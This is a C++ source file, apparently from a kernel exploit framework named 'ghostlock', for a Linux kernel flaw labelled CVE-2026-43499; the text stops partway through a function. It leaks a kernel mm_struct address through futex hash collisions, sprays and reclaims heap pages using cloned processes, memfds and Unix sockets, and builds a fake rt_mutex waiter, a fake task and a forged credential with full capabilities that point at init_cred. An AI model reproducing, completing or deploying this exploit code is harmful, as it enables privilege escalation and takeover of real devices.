#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

/* CVE-2026-43499 heap page preparation, KernelSnitch leak child and the spray /
 * reclaim socket bookkeeping (F15 ownership move out of support/util.cpp).
 *
 * This TU is the single owner of the frozen KernelSnitch provider: its leak
 * adapter header includes kernelsnitch.h, whose context_* entry points are not
 * inline, so exactly one translation unit in the program may include it. The
 * moved statements are byte-identical to the support/util.cpp block they came
 * from; only the enclosing namespace changed. */
#include "backend/cve_2026_43499/spray.hpp"

/* memory/constants.hpp must precede support/log.hpp: log.hpp defines a
 * PAGE_SIZE macro that would otherwise expand inside the constants.hpp
 * declaration (the same ordering the block had in support/util.cpp). */
#include "memory/constants.hpp"
#include "memory/offset.h"

#include "support/decls.hpp"
#include "support/log.hpp"
#include "support/time.h"

#include "backend/cve_2026_43499/backend_profile/accessors.hpp"
#include "backend/cve_2026_43499_state.hpp"
#include "backend/cve_2026_43499/leak/address_discovery.h"
#include "backend/cve_2026_43499/route/route_policy.hpp"
#include "memory/heap_context.h"
#include "memory/target.h"
#include "profile/runtime_struct_offsets.h"
#include "session/core_session.hpp"
#include "session/runtime_config.h"
#include "support/native_resource.hpp"

#include <sys/socket.h>
#include <sys/wait.h>

#include <array>
#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <string_view>
#include <type_traits>

#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>

/* The moved attack statements keep their unqualified call sites: these
 * re-exports resolve exactly the neutral symbols that used to be found in
 * namespace ghostlock::support. */
namespace {
    using ghostlock::support::ChildProcess;
    using ghostlock::support::clone_child;
    using ghostlock::support::kill_child;
    using ghostlock::support::make_scope_exit;
    using ghostlock::support::open_memfd;
    using ghostlock::support::put32;
    using ghostlock::support::put64;
    using ghostlock::support::read_first_line;
}

namespace ghostlock::backend::cve_2026_43499::spray {
/* Session aliases kept from the preprocessor era: the attack statements were
 * written with these short names, and references preserve every call site
 * without the macro. */
namespace {
    auto &ks = ghostlock::backend::cve43499_state(ghostlock::session::g_exploit_session).heap.snitch;
    auto &mm_objs_per_slab = ghostlock::backend::cve43499_state(ghostlock::session::g_exploit_session).heap.mm_objs_per_slab;
    auto &reclaim_sv = ghostlock::backend::cve43499_state(ghostlock::session::g_exploit_session).heap.current.reclaim.fd;
    auto &prepare_ctx = ghostlock::backend::cve43499_state(ghostlock::session::g_exploit_session).heap.prepare;
    auto &spray_ctx = ghostlock::backend::cve43499_state(ghostlock::session::g_exploit_session).heap.spray;
    auto &pre_ctx = ghostlock::backend::cve43499_state(ghostlock::session::g_exploit_session).heap.pre;
    auto &post_ctx = ghostlock::backend::cve43499_state(ghostlock::session::g_exploit_session).heap.post;
    auto &child_leak = ghostlock::backend::cve43499_state(ghostlock::session::g_exploit_session).heap.leak_child;

    /* The skb buffer is reallocated on every prepare pass, so the pointer is
     * read at each use instead of being bound once. */
    unsigned char *skb_buf() {
        return ghostlock::backend::cve43499_state(ghostlock::session::g_exploit_session).heap.skb_buffer.get();
    }
} // namespace

    static const profile::kernel_offsets *profile_values(void) {
        return ghostlock::backend::cve43499_state(session::g_exploit_session).profile.values();
    }

    static long long ms_since(const struct timespec *t0) {
        return static_cast<long long>(runtime_time::runtime_elapsed_ms(t0));
    }

    void log_startup_context(void) {
        std::array < char, 256 > attr{};
        std::array < char, 32 > enforce{};
        std::array < char, 4096 > status{};
        std::array < char, 160 > limits{};
        snprintf(limits.data(), limits.size(),
                 "NoNewPrivs=? Seccomp=? Seccomp_filters=?");
        read_first_line("/proc/self/attr/current", attr.data(), attr.size());
        read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
        support::UniqueFd fd(open("/proc/self/status", O_RDONLY | O_CLOEXEC));
        if (fd.valid()) {
            const ssize_t n = read(fd.get(), status.data(), status.size() - 1);
            if (n > 0) {
                status[static_cast<size_t>(n)] = 0;
                const std::array<const char *, 3> names = {
                    "NoNewPrivs:", "Seccomp:", "Seccomp_filters:"
                };
                std::array < std::array < char, 32 >, 3 > values = {
                    {
                        std::array < char, 32 >{"?"},
                        std::array < char, 32 >{"?"},
                        std::array < char, 32 >{"?"},
                    }
                };
                const std::string_view status_view(status.data(), static_cast<size_t>(n));
                for (size_t i = 0; i < names.size(); i++) {
                    const size_t at = status_view.find(names[i]);
                    if (at == std::string_view::npos) continue;
                    std::string_view rest =
                            status_view.substr(at + strlen(names[i]));
                    const size_t first = rest.find_first_not_of("\t ");
                    if (first == std::string_view::npos) {
                        values[i][0] = 0;
                        continue;
                    }
                    rest.remove_prefix(first);
                    size_t len = rest.find_first_of("\r\n");
                    if (len == std::string_view::npos) len = rest.size();
                    if (len >= values[i].size()) {
                        len = values[i].size() - 1;
                    }
                    memcpy(values[i].data(), rest.data(), len);
                    values[i][len] = 0;
                }
                snprintf(limits.data(), limits.size(), "NoNewPrivs=%s Seccomp=%s "
                         "Seccomp_filters=%s", values[0].data(), values[1].data(),
                         values[2].data());
            }
        }
        struct timespec boot;
        SYSCHK(clock_gettime(CLOCK_BOOTTIME, &boot));
        double boot_ms =
                static_cast<double>(boot.tv_sec) * 1000.0 + static_cast<double>(boot.tv_nsec) / 1e6;
        pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u "
                   "boot_ms=%.0f attr=%s enforce=%s\n",
                   getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
                   attr.data(), enforce.data());
        pr_success("startup limits pid=%d %s\n", getpid(), limits.data());
        pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
                   getpid(), memory::BUILD_VARIANT_LABEL);
        pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
                   "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
                   "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
                   getpid(), (unsigned long long) ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.phys_offset,
                   (unsigned long long) ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.phys_load(),
                   (unsigned long long) (ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.phys_load() -
                                         ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.phys_offset),
                   (unsigned long long) ghostlock::profile::slide_nfulnl_logger(),
                   (unsigned long long) ghostlock::profile::slide_random_boot_id_data(),
                   (unsigned long long) ghostlock::profile::slide_init_task(),
                   (unsigned long long) ghostlock::profile::slide_root_task_group(),
                   (unsigned long long) ghostlock::profile::slide_sysctl_bootid());
    }

    void init_p0_profile(void) {
        pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
                (unsigned long long) ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.phys_load(),
                (unsigned long long) (ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.phys_load() -
                                      ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.phys_offset));
    }

    static int32_t fill_profile_cred_copy(unsigned char *p, size_t off) {
        const profile::kernel_offsets *v = profile_values();
        if (!v || !v->credential.copy_size || v->credential.copy_size > memory::ORDER3_SIZE ||
            v->credential.usage_offset + sizeof(uint32_t) > v->credential.copy_size ||
            v->credential.caps_offset + v->credential.caps_count * sizeof(uint64_t) >
            v->credential.copy_size) {
            pr_error("credential copy profile is incomplete\n");
            return 0;
        }
        unsigned char *c = p + off;
        memset(c, 0, v->credential.copy_size);
        put32(c, v->credential.usage_offset, v->credential.usage_value);
        for (uint32_t i = 0; i < v->credential.caps_count; i++) {
            put64(c, v->credential.caps_offset + i * sizeof(uint64_t), v->credential.caps_value);
        }

        const std::array<uint32_t, 4> ref_offsets = {
            v->credential.ref0_offset, v->credential.ref1_offset,
            v->credential.ref2_offset, v->credential.ref3_offset,
        };
        const std::array<uint64_t, 4> ref_images = {
            v->credential.ref0_image, v->credential.ref1_image,
            v->credential.ref2_image, v->credential.ref3_image,
        };
        if (v->credential.ref_count > ref_offsets.size()) {
            pr_error("credential reference count %u exceeds the %zu slots\n",
                     v->credential.ref_count, ref_offsets.size());
            return 0;
        }
        for (size_t i = 0; i < v->credential.ref_count; i++) {
            if (ref_offsets[i] + sizeof(uint64_t) > v->credential.copy_size) {
                pr_error("credential reference %zu exceeds configured copy size\n", i);
                return 0;
            }
            put64(c, ref_offsets[i],
                  ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.data_alias(ref_images[i]));
        }
        return 1;
    }

    pid_t clone_leak_child(void) {
        pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
        if (child == 0) {
            ghostlock::kernelsnitch::context_find_collisions(ks);
            exit(0);
        }
        return child;
    }

    void close_reclaim_sockets(void) {
        ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.destroy();
    }

    int32_t quarantine_reclaim_sockets(void) {
        return ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.move_to(ghostlock::backend::cve43499_state(session::g_exploit_session).heap.quarantine,
                                                               memory::PayloadPageState::Quarantined);
    }

    void release_quarantined_reclaim_sockets(void) {
        ghostlock::backend::cve43499_state(session::g_exploit_session).heap.quarantine.destroy();
    }

    Status stash_prebuilt_page(void) {
        return ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.move_to(ghostlock::backend::cve43499_state(session::g_exploit_session).heap.prebuilt,
                                                               memory::PayloadPageState::Prebuilt);
    }

    Status activate_prebuilt_page(void) {
        if (!ghostlock::backend::cve43499_state(session::g_exploit_session).heap.prebuilt.has_reclaim()) return false;
        close_reclaim_sockets();
        return ghostlock::backend::cve43499_state(session::g_exploit_session).heap.prebuilt.move_to(ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current,
                                                                memory::PayloadPageState::Current);
    }

    void discard_prebuilt_page(void) {
        ghostlock::backend::cve43499_state(session::g_exploit_session).heap.prebuilt.destroy();
    }

    void cleanup_page_prepare_state(void) {
        memory::close_ctx_memfds(&prepare_ctx);
        memory::close_ctx_memfds(&spray_ctx);
        memory::close_ctx_memfds(&pre_ctx);
        memory::close_ctx_memfds(&post_ctx);
        if (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.leak_memfd.get() > 0) {
            ghostlock::backend::cve43499_state(session::g_exploit_session).heap.leak_memfd.reset();
        }
        memory::free_ctx_storage(&prepare_ctx);
        memory::free_ctx_storage(&spray_ctx);
        memory::free_ctx_storage(&pre_ctx);
        memory::free_ctx_storage(&post_ctx);
        ghostlock::backend::cve43499_state(session::g_exploit_session).heap.skb_buffer.reset();
    }

    void prepare_ctxs(void) {
        prepare_ctx.childs.assign(8 * mm_objs_per_slab, 0);
        prepare_ctx.memfds.assign(8 * mm_objs_per_slab, 0);

        spray_ctx.childs.assign((1 + memory::MM_PARTIALS) * mm_objs_per_slab, 0);
        spray_ctx.memfds.assign((1 + memory::MM_PARTIALS) * mm_objs_per_slab, 0);

        pre_ctx.childs.assign(mm_objs_per_slab - 1, 0);
        pre_ctx.memfds.assign(mm_objs_per_slab - 1, 0);

        post_ctx.childs.assign(mm_objs_per_slab, 0);
        post_ctx.memfds.assign(mm_objs_per_slab, 0);
    }

    int32_t prepare_skb_payload(uintptr_t base, const memory::WriteRequest *request) {
        memset(skb_buf(), 0, memory::SKB_SEND_SIZE);

        const bool tcp_layout = ghostlock::backend::cve_2026_43499::route::route_capability(
            ghostlock::backend::cve43499_state(session::g_exploit_session).profile,
            [](auto policy) { return std::decay_t<decltype(policy)>::tcp_payload_layout; });
        const profile::TcpZerocopyLayout tcp_geometry =
                ghostlock::backend::cve43499_state(session::g_exploit_session).profile.tcp_zerocopy_layout();
        if (tcp_layout &&
            (!tcp_geometry.payload_delta || !tcp_geometry.chunk_bias ||
             !tcp_geometry.fake_task_off || !tcp_geometry.cred_copy_off)) {
            /* Required geometry, fail closed: a tcp profile without the payload
             * placement must not fall back to another kernel's constants. */
            pr_warning("tcp route payload layout missing from profile\n");
            return -1;
        }
        long long payload_delta =
                tcp_layout ? *tcp_geometry.payload_delta : memory::SKB_DATA_DELTA;
        size_t chunk_bias = tcp_layout ? static_cast<size_t>(*tcp_geometry.chunk_bias)
                                       : static_cast<size_t>(memory::SKB_FRAG_BIAS);
        size_t fake_task_off = tcp_layout ? static_cast<size_t>(*tcp_geometry.fake_task_off)
                                          : static_cast<size_t>(memory::FAKE_TASK_OFF);

        uintptr_t payload_base = base + static_cast<uintptr_t>(payload_delta);

        (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_lock) = payload_base + memory::LOCK_OFF;
        (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_w0) = payload_base + memory::W0_OFF;
        (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_task) = payload_base + fake_task_off;
        uintptr_t default_fops = payload_base + memory::FOPS_TABLE_OFF;
        uintptr_t credential_fops =
                payload_base + (tcp_layout
                                    ? static_cast<size_t>(*tcp_geometry.cred_copy_off)
                                    : memory::CRED_COPY_OFF);
        memory::PayloadWriteLayout write_layout = payload_write_layout(
            request, base, default_fops, credential_fops,
            ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.
            data_alias(ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.init_cred_image_addr()));
        (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_parent) = write_layout.parent;
        (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_right) = write_layout.right;
        (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_left) = write_layout.left;
        (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_fops) = write_layout.fops;

        uintptr_t write_pc = (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_parent);
        uintptr_t write_right = (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_right);
        uintptr_t write_left = (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_left);
        /* Direct-map aliases (data_addr) resolve to the same physical pages and are
         * dereferenceable on every SoC — the tcp route already uses ghostlock::profile::slide_init_task()
         * the same way for the on-stack waiter (upstream U01-D). */
        uint64_t waiter_task = ghostlock::profile::slide_init_task();
        uint64_t task_group = ghostlock::profile::slide_root_task_group();
        uint64_t pi_top_task = ghostlock::profile::slide_init_task();

        const profile::kernel_offsets *v = profile_values();
        int32_t compact = ghostlock::backend::cve43499_state(session::g_exploit_session).profile.has_compact_waiter();

        for (size_t chunk = 0; chunk < memory::SKB_SEND_SIZE; chunk += memory::ORDER3_SIZE) {
            unsigned char *p = skb_buf() + chunk + chunk_bias;

            put32(p, memory::LOCK_OFF + 0x00, 0);
            put64(p, memory::LOCK_OFF + 0x08, (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_w0));
            put64(p, memory::LOCK_OFF + 0x10, (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_w0));
            put64(p, memory::LOCK_OFF + 0x18, (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_task) | 1);

            if (compact) {
                /* Words ride the erase relink: pc = value, rb_left = dest,
                 * rb_right = 0 or the one-child arm also clobbers *(value) with
                 * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
                 * would leave the node parentless for enqueue_pi to trash
                 * fake_task. prio > 120 gates this erase. The relink's second
                 * write lands in *(value+8): cred image on W2, page rb_root at 0. */
                put64(p, memory::W0_OFF + 0x00, 1); /* tree_entry.rb_parent_color */
                put64(p, memory::W0_OFF + 0x08, 0); /* tree_entry.rb_right */
                put64(p, memory::W0_OFF + 0x10, 0); /* tree_entry.rb_left */
                (void) encode_compact_waiter(
                    {
                        reinterpret_cast<std::byte *>(p + memory::W0_OFF),
                        memory::kCompactWaiterBytes
                    },
                    *request, write_layout);
                put64(p, memory::W0_OFF + 0x30, waiter_task); /* task */
                put64(p, memory::W0_OFF + 0x38, (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_lock)); /* lock */
                put32(p, memory::W0_OFF + 0x40, 0); /* wake_state */
                put32(p, memory::W0_OFF + 0x44, memory::FAKE_WAITER_PRIO); /* prio */
                put64(p, memory::W0_OFF + 0x48, 0); /* deadline */
                put64(p, memory::W0_OFF + 0x50, 0); /* ww_ctx */
            } else {
                /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
                put64(p, memory::W0_OFF + 0x00, 1);
                put64(p, memory::W0_OFF + 0x08, 0);
                put64(p, memory::W0_OFF + 0x10, 0);
                put32(p, memory::W0_OFF + memory::FAKE_WAITER_TREE_PRIO_OFF, memory::FAKE_WAITER_PRIO);
                put64(p, memory::W0_OFF + memory::FAKE_WAITER_TREE_DEADLINE_OFF, 0);
                put64(p, memory::W0_OFF + memory::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
                put64(p, memory::W0_OFF + memory::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
                put64(p, memory::W0_OFF + memory::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
                put32(p, memory::W0_OFF + memory::FAKE_WAITER_PI_TREE_PRIO_OFF, memory::FAKE_WAITER_PRIO);
                put64(p, memory::W0_OFF + memory::FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
                put64(p, memory::W0_OFF + memory::FAKE_WAITER_TASK_OFF, waiter_task);
                put64(p, memory::W0_OFF + memory::FAKE_WAITER_LOCK_OFF,
                      (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_lock));
                put32(p, memory::W0_OFF + memory::FAKE_WAITER_WAKE_STATE_OFF, 0);
                put64(p, memory::W0_OFF + memory::FAKE_WAITER_WW_CTX_OFF, 0);
            }

            /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
            uint32_t ft_prio_off = compact
                                       ? v->task.prio
                                       : ghostlock::profile::fake_task_prio_off();
            uint32_t ft_nprio_off = compact
                                        ? v->task.normal_prio
                                        : ghostlock::profile::fake_task_normal_prio_off();
            uint32_t ft_tg_off = compact
                                     ? v->task.sched_task_group
                                     : ghostlock::profile::fake_task_task_group_off();
            uint32_t ft_pi_lock_off = compact
                                          ? v->task.pi_lock
                                          : ghostlock::profile::fake_task_pi_lock_off();
            uint32_t ft_pi_wait_off = compact
                                          ? v->task.pi_waiters
                                          : ghostlock::profile::fake_task_pi_waiters_off();
            uint32_t ft_pi_top_off = compact
                                         ? v->task.pi_top_task
                                         : ghostlock::profile::fake_task_pi_top_task_off();
            uint32_t ft_pi_blocked_off = compact
                                             ? v->task.pi_blocked_on
                                             : ghostlock::profile::fake_task_pi_blocked_on_off();

            put32(p, fake_task_off + memory::FAKE_TASK_USAGE_OFF, 0x100);
            put32(p, fake_task_off + ft_prio_off, memory::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_nprio_off, memory::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_pi_lock_off, 0);
            /* Empty PI waiters avoid tree rebalancing during reinsertion. */
            put64(p, fake_task_off + ft_pi_wait_off, 0);
            put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
            put64(p, fake_task_off + ft_tg_off, task_group);
            put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
            put64(p, fake_task_off + ft_pi_blocked_off, 0);

            put64(p, memory::RIGHT_OFF + 0x00, (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_parent));
            put64(p, memory::RIGHT_OFF + 0x08, 0);
            put64(p, memory::RIGHT_OFF + 0x10, 0);

            put64(p, memory::LEFT_OFF + 0x00, (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_parent));
            put64(p, memory::LEFT_OFF + 0x08, 0);
            put64(p, memory::LEFT_OFF + 0x10, 0);

            if (write_layout.needs_credential_copy &&
                !fill_profile_cred_copy(p, tcp_layout ? memory::TCP_CRED_COPY_OFF : memory::CRED_COPY_OFF)) {
                return 0;
            }
        }
        return 1;
    }

    /* TODO(CPP07-OWNER): partial prepare failure injection still needs a
     * syscall-level fault-injection framework; the ownership refactor itself is
     * complete (CPP12h). Completion: add the framework, cover the early-exit
     * paths, then delete this comment and the residual row. */
    uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
        struct timespec t_spray;
        clock_gettime(CLOCK_MONOTONIC, &t_spray);
        /* Release every userspace reference from the preceding write before the
         * context arrays are replaced. Keeping the final post-spray memfd pinned
         * leaked one mm_struct per stage and progressively poisoned later sprays. */
        close_reclaim_sockets();
        cleanup_page_prepare_state();
        mm_objs_per_slab = memory::ORDER3_SIZE /
                           ghostlock::backend::cve43499_state(session::g_exploit_session).profile.mm_struct_stride(memory::MM_STRUCT_SZ);
        prepare_ctxs();

        ghostlock::backend::cve43499_state(session::g_exploit_session).heap.skb_buffer = std::make_unique<unsigned char[]>(memory::SKB_SEND_SIZE);
        memset(skb_buf(), 0x41, memory::SKB_SEND_SIZE);

        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
            prepare_ctx.childs[i] = clone_child();
            prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
        }

        for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
            spray_ctx.childs[i] = clone_child();
            spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
        }

        int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
        kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
            ghostlock::backend::cve43499_state(session::g_exploit_session).profile.mm_struct_stride(memory::MM_STRUCT_SZ),
            memory::MM_ORDER, static_cast<size_t>(cpu_count), ghostlock::profile::kernelsnitch_collisions(), 0,
            static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        /* The forked leak child borrows the shared mmap context through this
         * compatibility alias; the owner remains the only releaser. */
        auto clear_snitch_alias =
                make_scope_exit([]() noexcept { ks = nullptr; });
        ks = snitch.get();
        pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
                cpu_count, ms_since(&t_spray));

        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            pre_ctx.childs[i] = clone_child();
        }
        child_leak = ChildProcess(clone_leak_child());
        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
            post_ctx.childs[i] = clone_child();
        }

        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
        }
        ghostlock::backend::cve43499_state(session::g_exploit_session).heap.leak_memfd.reset(open_memfd(child_leak.get()));
        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
            post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
        }

        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            kill_child(pre_ctx.childs[i]);
        }
        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
            kill_child(post_ctx.childs[i]);
        }
        for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
            kill_child(spray_ctx.childs[i]);
        }
        pr_info("[spray] finding futex collisions... +%lldms\n",
                ms_since(&t_spray));
        {
            struct timespec t_wait;
            clock_gettime(CLOCK_MONOTONIC, &t_wait);
            const pid_t leak_pid = child_leak.get();
            int32_t leak_status = 0;
            pid_t wp = 0;
            long long last_beat = 0;
            for (;;) {
                wp = waitpid(leak_pid, &leak_status, WNOHANG);
                if (wp == leak_pid) {
                    child_leak.mark_reaped();
                    break;
                }
                if (wp < 0) {
                    pr_warning("waitpid leak child: %m\n");
                    child_leak.mark_reaped();
                    break;
                }
                long long waited = ms_since(&t_wait);
                uint32_t timeout_ms =
                        ghostlock::backend::cve43499_state(session::g_exploit_session).profile.execution()
                        ->heap_kernelsnitch_timeout_ms;
                if (static_cast<uint64_t>(waited) >= timeout_ms) {
                    pr_warning("leak child stuck >%ums, killing it\n", timeout_ms);
                    (void) child_leak.terminate_and_wait(SIGKILL);
                    break;
                }
                if (waited - last_beat >= 2000) {
                    size_t scan_done = ks->scan_done;
                    size_t scan_total = ks->total_futexes;
                    if (scan_done > scan_total) scan_done = scan_total;
                    size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
                    if (scan_id > static_cast<size_t>FUTEX_SZ) scan_id = static_cast<size_t>FUTEX_SZ;
                    pr_info("[spray]   still finding collisions (%llds) %zu%% "
                            "(futex 0x%zx/0x%zx)...\n",
                            waited / 1000,
                            scan_total ? scan_done * 100 / scan_total : 0,
                            scan_id, (size_t) FUTEX_SZ);
                    last_beat = waited;
                }
                usleep(50000);
            }
            if (wp == leak_pid &&
                (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
                pr_warning("leak child exit status=%d\n", leak_status);
            }
        }
        if (!snitch.has_collisions()) {
            pr_warning("[spray] futex collisions not found\n");
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        pr_info("[spray] futex collisions found +%lldms\n",
                ms_since(&t_spray));
        /* A3-2 item 3: resolve the leaked mm_struct through the fail-closed
         * contract handle instead of reading the KernelSnitch provider directly.
         * The adapter already restores the canonical VA (mm_struct | 0xf << 56)
         * and, on failure, writes the canonical all-zero result. This consumer is
         * the compatibility boundary: mapping ok == false back to the legacy
         * ~(uintptr_t)0 sentinel keeps the failure log, the stored last_mm_struct
         * and the direct-map guard below in their exact pre-A3-2 shape while the
         * contract itself stays fail-closed. */
        ghostlock::contract::AddressDiscoveryResult discovery{};
        const ghostlock::contract::AddressDiscoveryOps discovery_ops =
                kernelsnitch::address_discovery_ops(snitch.get());
        if (discovery_ops.available()) {
            (void) discovery_ops.discover(discovery_ops.ctx, &discovery);
        }
        const uintptr_t leaked = discovery.ok
                                         ? static_cast<uintptr_t>(discovery.mm_struct)
                                         : static_cast<uintptr_t>(-1);
        pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
                leaked, ms_since(&t_spray));
        (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.last_mm_struct) = leaked;
        /* mm_structs live in the direct map */
        if (leaked == static_cast<uintptr_t>(-1) ||
            leaked < memory::KERNELSNITCH_IDENTITY_START ||
            leaked >= memory::g_direct_map_end) {
            pr_warning("KernelSnitch mm_struct leak failed\n");
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        uintptr_t base = leaked & ~(memory::ORDER3_SIZE - 1);
        if (!prepare_skb_payload(base, request)) {
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
        ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.state = memory::PayloadPageState::Current;
        int32_t sndbuf = 1 << 20;
        setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        int32_t reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
        if (reclaim_flags >= 0) {
            fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
        }
        std::array<int32_t, 2> pcp_shaping_sv{};
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv.data()));

        struct iovec iov{};
        iov.iov_base = skb_buf();
        iov.iov_len = memory::SKB_SEND_SIZE;

        struct msghdr msg{};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

        memory::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            SYSCHK(close(pre_ctx.memfds[i]));
            pre_ctx.memfds[i] = -1;
        }
        for (size_t i = 0; i < post_ctx.childs.size() - 1; i++) {
            SYSCHK(close(post_ctx.memfds[i]));
            post_ctx.memfds[i] = -1;
        }
        for (size_t i = 0; i < spray_ctx.childs.size(); i += mm_objs_per_slab) {
            SYSCHK(close(spray_ctx.memfds[i]));
            spray_ctx.memfds[i] = -1;
        }

        SYSCHK(close(pcp_shaping_sv[0]));
        SYSCHK(close(pcp_shaping_sv[1]));
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        /* Reap the snitch child's memfd: closing it is what drops the
         * mm_struct reference the spray depends on (the previous SYSCHK_pr
         * expansion dropped the close call). */
        const int32_t leak_fd = ghostlock::backend::cve43499_state(session::g_exploit_session).heap.leak_memfd.release();
        if (close(leak_fd) != 0) {
            pr_error("SYSCHK(close(memfd_leak)): %m\n");
        }
        ghostlock::backend::cve43499_state(session::g_exploit_session).heap.leak_memfd.reset();
        for (int32_t i = 0; i < memory::SKB_RECLAIM_SENDS; i++) {
            errno = 0;
            ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
            if (sent <= 0) {
                break;
            }
        }
        pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
        snitch.reset();

        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
            SYSCHK(close(prepare_ctx.memfds[i]));
            prepare_ctx.memfds[i] = -1;
            kill_child(prepare_ctx.childs[i]);
        }

        return base;
    }

    uintptr_t prepare_good_kernel_page(const memory::WriteRequest &request) {
        uint32_t max_attempts = ghostlock::backend::cve43499_state(session::g_exploit_session).profile.heap_prepare_max_attempts();
        struct timespec t_good;
        clock_gettime(CLOCK_MONOTONIC, &t_good);
        struct timespec deadline = t_good;
        uint64_t timeout_ns =
                static_cast<uint64_t>(ghostlock::backend::cve43499_state(session::g_exploit_session).profile.heap_prepare_timeout_ms()) * 1000000ULL;
